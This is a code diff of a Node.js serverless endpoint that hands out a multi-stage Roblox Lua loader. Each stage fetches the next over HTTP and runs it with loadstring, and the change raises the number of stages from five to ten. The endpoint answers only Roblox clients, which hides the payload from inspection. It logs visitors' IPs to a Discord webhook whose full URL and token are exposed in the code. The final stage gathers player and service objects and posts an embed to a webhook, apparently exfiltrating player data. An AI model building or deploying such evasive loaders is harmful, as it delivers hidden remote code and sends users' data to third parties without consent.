@@ -5,6 +5,7 @@ let sessions = {};
 let blacklist = {}; 
 const SECRET_SALT = "NDRAAWZAJA";
 
+// Replace with your actual Discord Webhook URL
 const WEBHOOK = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";
 
 async function checkSystemHealth(msg) {
@@ -49,6 +50,7 @@ module.exports = async (req, res) => {
         const currentStep = parseInt(step) || 0;
         const now = Date.now();
 
+        // 3. RAPID-FIRE / BOT DETECTION
         if (currentStep > 0) {
             if (!sessions[ip] || sessions[ip].lastStep !== currentStep - 1 || key !== sessions[ip].nextKey) {
                 return res.status(200).send("warn('Vercel: Invocation Error (Inconsistent Layer Flow)')");
@@ -59,15 +61,22 @@ module.exports = async (req, res) => {
                 blacklist[ip] = true;
                 const ubk = Buffer.from(`${ip}_${now}`).toString('base64');
                 const signature = crypto.createHmac('sha256', SECRET_SALT).update(ubk).digest('hex');
-                await checkSystemHealth(`🚨 **BOT DETECTED!**\nIP: \`${ip}\` requested too fast.\nUnban Link: https://${host}${currentPath}?unban_key=${ubk}&sig=${signature}`);
-                return res.status(403).send("warn('Vercel: Connection Terminated')");
+                
+                // MENGGUNAKAN currentPath untuk link unban
+                await checkSystemHealth(`🚨 **BOT DETECTED!**\nIP: \`${ip}\` requested Layer ${currentStep} too fast (${timeDiff}ms).\nUnban Link: https://${host}${currentPath}?unban_key=${ubk}&sig=${signature}`);
+                
+                return res.status(403).send("warn('Vercel: Connection Terminated (Bot Activity Detected)')");
             }
         }
 
+        // --- LAYER LOGIC ---
+
+        // INITIAL STEP (Step 0)
         if (currentStep === 0) {
             if (!agent.includes("Roblox")) {
-                return res.status(200).send("404");
+                return res.status(200).send("NGAPAIN BANG?");
             }
+            
             const sessionID = Math.random().toString(36).substring(2, 12);
             const firstKey = Math.random().toString(36).substring(2, 8);
             sessions[ip] = { id: sessionID, lastStep: 0, nextKey: firstKey, lastTime: now };
@@ -80,8 +89,8 @@ if response then loadstring(response)() end`
             );
         }
 
-        // Intermediate Steps 1 - 4
-        if (currentStep >= 1 && currentStep <= 4) {
+        // INTERMEDIATE STEPS (Step 1 to 9)
+        if (currentStep >= 1 && currentStep <= 9) {
             const nextKey = Math.random().toString(36).substring(2, 8);
             sessions[ip].lastStep = currentStep;
             sessions[ip].nextKey = nextKey;
@@ -95,14 +104,13 @@ if r then loadstring(r)() end`
             );
         }
 
-        // Final Step (Step 5)
-        if (currentStep === 5) {
-            await checkSystemHealth(`🛡️ **System Success**\nIP: \`${ip}\` successfully passed 5 security layers.`);
+        // FINAL PAYLOAD (Step 10)
+        if (currentStep === 10) {
+            await checkSystemHealth(`🛡️ **System Success**\nIP: \`${ip}\` successfully passed 10 security layers.`);
             delete sessions[ip];
 
             return res.status(200).send(
-`
-local HttpService = game:GetService("HttpService")
+`local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -229,8 +237,7 @@ pcall(function()
         Headers = {["Content-Type"] = "application/json"},
         Body = HttpService:JSONEncode({embeds = {embed}})
     })
-end)
-`
+end)`
             );
         }
 
